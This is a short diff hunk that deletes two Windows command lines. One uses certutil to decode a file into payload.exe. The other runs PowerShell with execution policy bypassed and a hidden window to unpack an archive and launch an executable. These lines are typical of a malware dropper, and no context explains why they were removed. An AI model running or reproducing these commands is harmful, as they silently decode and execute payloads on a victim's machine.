@@ -1,2 +1,0 @@
-copy payload.zip payload.txt && certutil -decodehex payload.txt payload.exe
-powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Expand-Archive -Path 'C:\Temp\payload.zip' -DestinationPath 'C:\Temp\extracted' -Force; Start-Process 'binary.exe'"
